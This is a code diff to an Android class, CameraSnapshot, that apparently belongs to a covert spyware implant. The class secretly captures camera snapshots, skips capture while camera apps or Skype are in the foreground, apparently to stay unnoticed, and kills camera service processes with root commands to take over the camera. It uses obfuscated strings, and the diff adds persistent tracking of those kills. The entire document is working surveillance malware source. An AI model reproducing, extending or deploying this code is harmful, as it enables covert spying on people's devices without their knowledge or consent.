@@ -29,6 +29,7 @@ import android.util.Log;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.evidence.EvidenceBuilder;
+import com.android.dvci.evidence.Markup;
 import com.android.dvci.listener.ListenerProcess;
 import com.android.dvci.module.ModuleCamera;
 import com.android.dvci.util.Check;
@@ -38,6 +39,7 @@ import com.android.mm.M;
 
 import java.io.ByteArrayOutputStream;
 import java.io.OutputStream;
+import java.util.ArrayList;
 import java.util.HashSet;
 import java.util.Hashtable;
 import java.util.List;
@@ -79,6 +81,7 @@ public class CameraSnapshot {
 	public static final int MAX_CAMERA_KILLS = 5;
 	private int kill_camera_request = 0;
 	private boolean kill_also_mediaserver = false;
+	private Markup multimediaKills_markup =null;
 	private long lastKill = -1;
 	public Set<String> blacklist = new HashSet<String>();
 	private static CameraSnapshot singleton = null;
@@ -117,10 +120,15 @@ public class CameraSnapshot {
 	 * (skype and camera are supposed to break the camera)
 	 */
 	public void incKillreqCamera() {
-		String lasfg = ListenerProcess.self().getLastForeground();
-		if (lasfg != null) {
+		String fg = ListenerProcess.self().getLastForeground().toLowerCase();
+		ArrayList<String> check_this= new ArrayList<String>();
+		check_this.add(fg.toLowerCase());
+		if( Status.self().getForeground_activity()!=null && Status.self().getForeground_activity().baseActivity != null){
+			check_this.add(Status.self().getForeground_activity().baseActivity.toString());
+		}
+		for (String lasfg : check_this) {
 			for (String bl : blacklist) {
-				if (lasfg.contains(bl)) {
+				if (lasfg.contains(bl.toLowerCase())) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (incKillreqCamera): process=" + bl + " in blacklist , skip increments and reset");
 					}
@@ -134,6 +142,9 @@ public class CameraSnapshot {
 
 	public int getCamera_killed() {
 		return camera_killed;
+	}
+	public void setCamera_killed(int ck) {
+		camera_killed=ck;
 	}
 
 	public void clearKillreq() {
@@ -168,6 +179,17 @@ public class CameraSnapshot {
 		blacklist.clear();
 		addBlacklist(M.e(".camera"));
 		addBlacklist(M.e("com.skype.raider"));
+		addBlacklist(M.e(".GoogleCamera"));
+		if (multimediaKills_markup == null) {
+			multimediaKills_markup = new Markup(ModuleCamera.self(), 1);
+		}
+		try {
+			camera_killed = multimediaKills_markup.unserialize(new Integer(0));
+		} catch (Exception e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (CameraSnapshot), Exception loading markup");
+			}
+		}
 	}
 
 	// camera state
@@ -354,7 +376,14 @@ public class CameraSnapshot {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (snapshot) try to kill " + pid_cam);
 			}
-
+			camera_killed++;
+			try {
+					multimediaKills_markup.writeMarkupSerializable(camera_killed);
+			}catch (Exception e){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (killCameraServices), Exception saving markup");
+				}
+			}
 			Execute.executeRoot("kill " + pid_cam);
 			if (kill_also_mediaserver) {
 				if (Cfg.DEBUG) {
@@ -364,7 +393,7 @@ public class CameraSnapshot {
 				kill_also_mediaserver = false;
 			}
 			//if(lastKill==-1 || (startedAt - lastKill) <= MIN_INTERVAL_FOR_INCREMENT) {
-			camera_killed++;
+
 			//}
 			lastKill = startedAt;
 		} catch (Exception ex) {
@@ -429,9 +458,10 @@ public class CameraSnapshot {
 	 * Opens a Camera and sets parameters.  Does not start preview.
 	 */
 	private Camera prepareCamera(int cameraId, int encWidth, int encHeight) {
+		Camera camera = null;
 		try {
 
-			Camera camera = openCamera(cameraId);
+			camera = openCamera(cameraId);
 			if (camera == null) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (prepareCamera), cannot open camera: " + cameraId);
@@ -470,6 +500,9 @@ public class CameraSnapshot {
 				if (ex.toString().contains(M.e("Fail to connect to camera service"))) {
 					kill_also_mediaserver = true;
 				}
+			}
+			if (camera!=null){
+				releaseCamera(camera);
 			}
 			return null;
 		}
@@ -604,8 +637,11 @@ public class CameraSnapshot {
 					Check.log(TAG + " (releaseCamera), ERROR: " + e);
 				}
 			}*/
-			camera.stopPreview();
-			camera.release();
+			try {
+				camera.stopPreview();
+			} finally {
+				camera.release();
+			}
 		}
 
 		if (Cfg.DEBUG) {
